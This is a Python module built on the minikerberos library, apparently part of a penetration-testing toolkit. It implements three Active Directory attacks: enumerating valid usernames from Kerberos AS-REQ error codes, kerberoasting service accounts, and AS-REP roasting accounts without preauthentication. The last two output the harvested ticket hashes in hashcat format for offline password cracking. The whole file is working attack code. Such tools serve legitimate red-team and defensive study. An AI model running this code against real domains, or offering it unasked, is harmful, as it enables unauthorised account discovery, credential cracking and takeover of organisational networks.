import datetime
import secrets

from minikerberos import logger
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.network.aioclientsocket import AIOKerberosClientSocket
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.target import KerberosTarget
from minikerberos.common.creds import KerberosCredential
from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
from minikerberos import logger
from minikerberos.protocol.asn1_structs import PrincipalName, KDCOptions, \
	PADATA_TYPE, PA_PAC_REQUEST, krb5_pvno, KDC_REQ_BODY, AS_REQ

from minikerberos.protocol.errors import KerberosErrorCode
from minikerberos.protocol.constants import NAME_TYPE, MESSAGE_TYPE
from typing import List
from minikerberos.common.factory import KerberosClientFactory


async def krb5userenum(target:KerberosTarget, usernames:List[str], domain:str):
	def construct_tgt_req(username:str, domain:str):
		now = now = datetime.datetime.now(datetime.timezone.utc)
		kdc_req_body = {}
		kdc_req_body['kdc-options'] = KDCOptions(set(['forwardable','renewable','proxiable']))
		kdc_req_body['cname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': [username]})
		kdc_req_body['realm'] = domain.upper()
		kdc_req_body['sname'] = PrincipalName({'name-type': NAME_TYPE.PRINCIPAL.value, 'name-string': ['krbtgt', domain.upper()]})
		kdc_req_body['till']  = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['rtime'] = (now + datetime.timedelta(days=1)).replace(microsecond=0)
		kdc_req_body['nonce'] = secrets.randbits(31)
		kdc_req_body['etype'] = [23, 17, 18] #we "support" all MS related enctypes
		
		pa_data_1 = {}
		pa_data_1['padata-type'] = int(PADATA_TYPE('PA-PAC-REQUEST'))
		pa_data_1['padata-value'] = PA_PAC_REQUEST({'include-pac': True}).dump()
		
		kdc_req = {}
		kdc_req['pvno'] = krb5_pvno
		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_AS_REQ.value
		kdc_req['padata'] = [pa_data_1]
		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
		
		return AS_REQ(kdc_req)
	
	for username in usernames:
		ksoc = AIOKerberosClientSocket(target)
		req = construct_tgt_req(username, domain)
		rep = await ksoc.sendrecv(req.dump(), throw = False)
		if rep.name != 'KRB_ERROR':	
			# user doesnt need preauth, but it exists
			yield username, True, rep, None
			
		elif rep.native['error-code'] != KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED.value:
			# any other error means user doesnt exist
			yield username, False, rep, None
			
		else:
			# preauth needed, only if user exists
			yield username, True, rep, None


async def kerberoast(factory:KerberosClientFactory, usernames:List[str], domain:str, override_etype:List[int] = [23,17,18], cross_domain:bool = False):
	if not isinstance(usernames, list):
		usernames = [usernames]
	if not isinstance(override_etype, list):
		override_etype = [override_etype]
	
	for username in usernames:
		try:
			kcomm = factory.get_client()
			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
			spn = KerberosSPN.from_upn('%s@%s' % (username, domain))
			kcommnew = kcomm
			if cross_domain is True:
				_, _, _, new_factory = await kcomm.get_referral_ticket(spn.domain)
				kcommnew = new_factory.get_client()
			tgs, _, _ = await kcommnew.get_TGS(spn, override_etype = override_etype)
			yield username, TGSTicket2hashcat(tgs), None
		except Exception as e:
			logger.debug('Failed to get TGS ticket for user %s! Reason: %s' % (username, str(e)))
			yield username, None, str(e)


async def asreproast(target:KerberosTarget, usernames:List[str], domain:str, override_etype:List[int] = [23,17,18]):
	if not isinstance(usernames, list):
		usernames = [usernames]
	if not isinstance(override_etype, list):
		override_etype = [override_etype]
		
	for username in usernames:
		try:
			cred = KerberosCredential()
			cred.domain = domain
			cred.username = username
			kcomm = AIOKerberosClient(cred, target)
			await kcomm.get_TGT(override_etype = override_etype, decrypt_tgt = False)
			yield username, TGTTicket2hashcat(kcomm.kerberos_TGT), None
		except Exception as e:
			logger.debug('Error while roasting client %s/%s Reason: %s' % (cred.domain, cred.username, str(e)))
			yield username, None, e

	